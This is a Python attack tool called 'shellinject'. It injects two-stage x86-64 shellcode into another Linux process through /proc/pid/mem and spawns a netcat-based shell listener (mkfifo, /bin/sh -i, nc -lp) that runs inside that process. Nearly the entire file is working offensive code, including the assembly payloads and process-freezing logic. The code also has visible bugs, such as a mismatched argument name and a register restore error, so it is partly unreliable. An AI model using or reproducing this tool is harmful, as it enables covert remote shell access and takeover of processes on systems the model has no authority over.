#!/usr/bin/env python3

f"Python version >= 3.6 required!"
# ^^^ fstrings are valid since python 3.6, will syntax error otherwise

BANNER = r"""
       .__           .__  .__  .__            __               __
  _____|  |__   ____ |  | |  | |__| ____     |__| ____   _____/  |_
 /  ___/  |  \_/ __ \|  | |  | |  |/    \    |  |/ __ \_/ ___\   __\
 \___ \|   Y  \  ___/|  |_|  |_|  |   |  \   |  \  ___/\  \___|  |
/____  >___|  /\___  >____/____/__|___|  /\__|  |\___  >\___  >__|
     \/     \/     \/                  \/\______|    \/     \/
source: https://github.com/DavidBuchanan314/shellinject
"""

import argparse
import os
import re
import signal
import time
import subprocess

from elftools.elf.elffile import ELFFile

STACK_BACKUP_SIZE = 8 * 16
STAGE2_SIZE = 0x8000


def ansi_color(name):
	color_codes = {
		"blue": 34,
		"red": 91,
		"green": 32,
		"default": 39,
	}
	return f"\x1b[{color_codes[name]}m"


def log(msg, color="blue", symbol="*"):
	print(f"[{ansi_color(color)}{symbol}{ansi_color('default')}] {msg}")


def log_success(msg):
	log(msg, "green", "+")


def log_error(msg):
	log(msg, "red", "!")
	raise Exception(msg)


def assemble(source):
	cmd = "gcc -x assembler - -o /dev/stdout -nostdlib -Wl,--oformat=binary -m64"
	argv = cmd.split(" ")
	prefix = b".intel_syntax noprefix\n.globl _start\n_start:\n"

	program = prefix + source.encode()
	pipe = subprocess.PIPE

	result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)

	if result.returncode != 0:
		emsg = result.stderr.decode().strip()
		log_error("Assembler command failed:\n\t" + emsg.replace("\n", "\n\t"))

	return result.stdout


def shellinject(pid, listen_port, stopmethod="sigstop"):
	if stopmethod == "sigstop":
		log("Sending SIGSTOP")
		os.kill(pid, signal.SIGSTOP)
		while True:
			with open(f"/proc/{pid}/stat") as stat_file:
				state = stat_file.read().split(" ")[2]
			if state in ["T", "t"]:
				break
			log("Waiting for process to stop...")
			time.sleep(0.1)
	elif stopmethod == "cgroup_freeze":
		freeze_dir = "/sys/fs/cgroup/freezer/shellinject_" + os.urandom(8).hex()
		os.mkdir(freeze_dir)
		with open(freeze_dir + "/tasks", "w") as task_file:
			task_file.write(str(pid))
		with open(freeze_dir + "/freezer.state", "w") as state_file:
			state_file.write("FROZEN\n")
		while True:
			with open(freeze_dir + "/freezer.state") as state_file:
				if state_file.read().strip() == "FROZEN":
					break
			log("Waiting for process to freeze...")
			time.sleep(0.1)
	else:
		log.warn("We're not going to stop the process first!")

	with open(f"/proc/{pid}/syscall") as syscall_file:
		syscall_vals = syscall_file.read().split(" ")
	rip = int(syscall_vals[-1][2:], 16)
	rsp = int(syscall_vals[-2][2:], 16)

	log(f"RIP: {hex(rip)}")
	log(f"RSP: {hex(rsp)}")

	stage2_path = f"/dev/shm/stage2_{os.urandom(8).hex()}.bin"

	shellcode = assemble(fr"""
		// push all the things
		pushf
		push rax
		push rbx
		push rcx
		push rdx
		push rbp
		push rsi
		push rdi
		push r8
		push r9
		push r10
		push r11
		push r12
		push r13
		push r14
		push r15

		// Open stage2 file
		mov rax, 2          # SYS_OPEN
		lea rdi, path[rip]  # path
		xor rsi, rsi        # flags (O_RDONLY)
		xor rdx, rdx        # mode
		syscall
		mov r14, rax        # save the fd for later

		// mmap it
		mov rax, 9              # SYS_MMAP
		xor rdi, rdi            # addr
		mov rsi, {STAGE2_SIZE}  # len
		mov rdx, 0x7            # prot (rwx)
		mov r10, 0x2            # flags (MAP_PRIVATE)
		mov r8, r14             # fd
		xor r9, r9              # off
		syscall
		mov r15, rax            # save mmap addr

		// close the file
		mov rax, 3    # SYS_CLOSE
		mov rdi, r14  # fd
		syscall

		// delete the file (not exactly necessary)
		mov rax, 87         # SYS_UNLINK
		lea rdi, path[rip]  # path
		syscall

		// jump to stage2
		jmp r15

	path:
		.ascii "{stage2_path}\0"
	""")

	with open(f"/proc/{pid}/mem", "wb+") as mem:
		# back up the code we're about to overwrite
		mem.seek(rip)
		code_backup = mem.read(len(shellcode))

		# back up the part of the stack that the shellcode will clobber
		mem.seek(rsp - STACK_BACKUP_SIZE)
		stack_backup = mem.read(STACK_BACKUP_SIZE)

		# write the primary shellcode
		mem.seek(rip)
		mem.write(shellcode)

	log("Wrote first stage shellcode")

	stage2 = assemble(fr"""
		cld
		fxsave moar_regs[rip]

		// Open /proc/self/mem
		mov rax, 2                   # SYS_OPEN
		lea rdi, proc_self_mem[rip]  # path
		mov rsi, 2                   # flags (O_RDWR)
		xor rdx, rdx                 # mode
		syscall
		mov r15, rax  # save the fd for later

		// seek to code
		mov rax, 8      # SYS_LSEEK
		mov rdi, r15    # fd
		mov rsi, {rip}  # offset
		xor rdx, rdx    # whence (SEEK_SET)
		syscall

		// restore code
		mov rax, 1                   # SYS_WRITE
		mov rdi, r15                 # fd
		lea rsi, old_code[rip]       # buf
		mov rdx, {len(code_backup)}  # count
		syscall

		// close /proc/self/mem
		mov rax, 3    # SYS_CLOSE
		mov rdi, r15  # fd
		syscall

		// move pushed regs to our new stack
		lea rdi, new_stack_base[rip-{STACK_BACKUP_SIZE}]
		mov rsi, {rsp-STACK_BACKUP_SIZE}
		mov rcx, {STACK_BACKUP_SIZE}
		rep movsb

		// restore original stack
		mov rdi, {rsp-STACK_BACKUP_SIZE}
		lea rsi, old_stack[rip]
		mov rcx, {STACK_BACKUP_SIZE}
		rep movsb
		lea rsp, new_stack_base[rip-{STACK_BACKUP_SIZE}]

		// fork
		mov rax, 57   # SYS_FORK
		syscall
		cmp rax, 0
		jne cleanup

		// TODO: set up our own reverse shell and dup2, rather than relying on netcat

		// setup argv pointers
		lea rax, argv[rip]
		lea rbx, argv0[rip]
		mov [rax], rbx
		lea rax, argv[rip+8]
		lea rbx, argv1[rip]
		mov [rax], rbx
		lea rax, argv[rip+16]
		lea rbx, argv2[rip]
		mov [rax], rbx

		// execve
		mov rax, 59  # SYS_EXECVE
		lea rdi, argv0[rip]  # pathname
		lea rsi, argv[rip]   # argv
		mov rdx, 0           # envp
		syscall

		// exit (we should never get here)
		mov rdi, -1
		mov rax, 60
		syscall

	cleanup:
		fxrstor moar_regs[rip]
		pop r15
		pop r14
		pop r13
		pop r12
		pop r11
		pop r10
		pop r9
		pop r8
		pop rdi
		pop rsi
		pop rbp
		pop rdx
		pop rcx
		pop rdx
		pop rax
		popf
		mov rsp, {rsp}
		jmp old_rip[rip]

	old_rip:
		.quad {rip}

	old_code:
		.byte {",".join(map(str, code_backup))}

	old_stack:
		.byte {",".join(map(str, stack_backup))}
		.align 16

	moar_regs:
		.space 512

	proc_self_mem:
		.ascii "/proc/self/mem\0"

	argv0:
		.ascii "/bin/sh\0"

	argv1:
		.ascii "-c\0"

	argv2:
		.ascii "rm -f /dev/shm/f; mkfifo /dev/shm/f; cat /dev/shm/f | /bin/sh -i 2>&1 | nc -lp {listen_port} > /dev/shm/f\0"

	argv:
		.quad argv0   # argv entries needs relocating at runtime
		.quad argv1
		.quad argv2
		.quad 0

	new_stack:
		.balign 0x8000

	new_stack_base:
	""")

	with open(stage2_path, "wb") as stage2_file:
		os.chmod(stage2_path, 0o666)
		stage2_file.write(stage2)

	log(f"Wrote stage2 to {repr(stage2_path)}")

	if stopmethod == "sigstop":
		log("Continuing process...")
		os.kill(pid, signal.SIGCONT)
	elif stopmethod == "cgroup_freeze":
		log("Thawing process...")
		with open(freeze_dir + "/freezer.state", "w") as state_file:
			state_file.write("THAWED\n")

		# put the task back in the root cgroup
		with open("/sys/fs/cgroup/freezer/tasks", "w") as task_file:
			task_file.write(str(pid))

		# cleanup
		os.rmdir(freeze_dir)

	log_success("Done!")


if __name__ == "__main__":
	print(BANNER)

	parser = argparse.ArgumentParser(
		description="Spawn a reverse TCP shell in the context of another linux process.")

	parser.add_argument("pid", metavar="pid", type=int,
		help="The pid of the target process")

	parser.add_argument("--port", metavar="listen_port", type=int,
		help="Reverse shell listener port (Default: 31337)")

	parser.add_argument("--stopmethod",
		choices=["sigstop", "cgroup_freeze", "none"],
		help="How to stop the target process prior to shellcode injection. \
		      SIGSTOP (default) can have side-effects. cgroup freeze requires root.\
		      'none' is likely to cause race conditions.")

	args = parser.parse_args()

	shellinject(args.pid, args.listen_port or 31337, args.stopmethod or "sigstop")
